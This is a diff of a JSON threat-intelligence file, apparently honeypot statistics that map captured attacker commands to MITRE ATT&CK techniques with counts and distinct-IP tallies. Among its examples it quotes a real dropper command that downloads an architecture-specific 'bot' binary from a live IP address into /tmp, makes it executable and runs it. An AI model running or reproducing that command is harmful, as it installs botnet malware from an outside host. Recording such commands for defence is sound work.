@@ -25,8 +25,8 @@
         "defense-impairment"
       ],
       "url": "https://attack.mitre.org/techniques/T1222/002",
-      "count": 10863,
-      "distinct_ips": 547,
+      "count": 10911,
+      "distinct_ips": 548,
       "examples": [
         "m=$(uname -m 2>/dev/null); case $m in arm*) m=arm;; aarch64*) m=aarch64;; mips*el*) m=mipsel;; mips*) m=mips;; i*86*|x86*) m=x86_64;; *) m=arm;; esac; (wget -q http://176.65.134.121:7372/bot.$m -O /tmp/.z 2>/dev/null || wget -q http://176.65.134.121:7372/bot.$m -O /tmp/.z 2>/dev/null) && chmod +x /tmp/.z && (/tmp/.z 176.65.134.121 176.65.134.121 >/dev/null 2>&1 &) >/dev/null 2>&1 &",
         "echo 'chmod +x /tmp/.st' >> /tmp/.iu",
@@ -113,6 +113,19 @@
       ]
     },
     {
+      "id": "T1016",
+      "name": "System Network Configuration Discovery",
+      "tactics": [
+        "discovery"
+      ],
+      "url": "https://attack.mitre.org/techniques/T1016",
+      "count": 12,
+      "distinct_ips": 11,
+      "examples": [
+        "ifconfig"
+      ]
+    },
+    {
       "id": "T1685.006",
       "name": "Clear Linux or Mac System Logs",
       "tactics": [
@@ -144,19 +157,6 @@
       ]
     },
     {
-      "id": "T1016",
-      "name": "System Network Configuration Discovery",
-      "tactics": [
-        "discovery"
-      ],
-      "url": "https://attack.mitre.org/techniques/T1016",
-      "count": 11,
-      "distinct_ips": 11,
-      "examples": [
-        "ifconfig"
-      ]
-    },
-    {
       "id": "T1033",
       "name": "System Owner/User Discovery",
       "tactics": [
@@ -184,6 +184,6 @@
       ]
     }
   ],
-  "total_commands": 362715,
-  "matched_commands": 136145
+  "total_commands": 362973,
+  "matched_commands": 136194
 }
